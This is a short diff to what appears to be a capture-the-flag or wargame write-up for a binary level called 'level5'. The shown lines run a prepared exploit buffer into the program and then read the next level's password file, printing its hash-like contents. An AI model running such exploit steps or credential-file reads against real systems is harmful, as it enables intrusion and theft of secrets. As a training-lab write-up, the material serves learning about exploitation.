@@ -36,4 +36,5 @@ The address of function "o" is 0x080484a4. The first 2 bytes being equal, we onl
 
 > bash /tmp/run.sh
 > cat /tmp/buff - | ./level5
-> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+> cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
